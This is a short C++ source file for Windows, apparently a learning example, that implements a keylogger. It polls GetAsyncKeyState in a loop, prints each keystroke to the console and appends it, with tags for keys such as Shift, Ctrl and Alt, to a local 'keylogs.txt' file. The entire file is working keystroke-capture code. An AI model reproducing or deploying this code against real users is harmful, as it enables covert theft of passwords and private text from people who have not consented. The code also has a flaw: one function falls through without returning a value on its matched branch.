#include <Windows.h>
#include <iostream>
#include <string>
#include <fstream>

using namespace std;

void WriteToLog(LPCSTR text)
{
	ofstream logfile;
	logfile.open("keylogs.txt", fstream::app);
	logfile << text; // Ghi chuoi ra file
	logfile.close();
}

bool KeyIsListed(int ikey)
{
	switch (ikey)
	{
	case VK_SPACE:		cout << " "; WriteToLog(" "); break;					// Space
	case VK_RETURN:		cout << "\n"; WriteToLog("\n"); break;					// Enter
	case VK_SHIFT:		cout << " *SHIFT* "; WriteToLog(" *SHIFT* "); break;	// Shift
	case VK_BACK:		cout << "\b"; WriteToLog("\b"); break;					// Backspace
	case VK_RBUTTON:	cout << " *RCLICK* "; WriteToLog(" *RCLICK* "); break;	// Right Click
	case VK_LBUTTON:	cout << " *LCLICK* "; WriteToLog(" *LCLICK* "); break;	// Left Click
	case VK_TAB:		cout << " *TAB* "; WriteToLog(" *TAB* "); break;		// TAB
	case VK_CAPITAL:	cout << " *CAPSLOCK* "; WriteToLog(" *CAPSLOCK* "); break;	// CAPS LOCK
	case VK_CONTROL:	cout << " *CTRL* "; WriteToLog(" *CTRL* "); break;		// CTRL
	case VK_MENU:		cout << " *ALT* "; WriteToLog(" *ALT* "); break;		// ALT
	default: return false;
	}
}

int main()
{
	char key;
	while (TRUE)
	{
		Sleep(10);
		for (key = 0; key <= 190; key++)
		{
			if (GetAsyncKeyState(key) == -32767)
			{
				if (KeyIsListed(key) == FALSE)
				{
					cout << key;
					ofstream logfile;
					logfile.open("keylogs.txt", fstream::app);
					logfile << key;
					logfile.close();
				}
			}
		}
	}

	return 0;
}

// Reference: https://msdn.microsoft.com/en-us/library/windows/desktop/dd375731(v=vs.85).aspx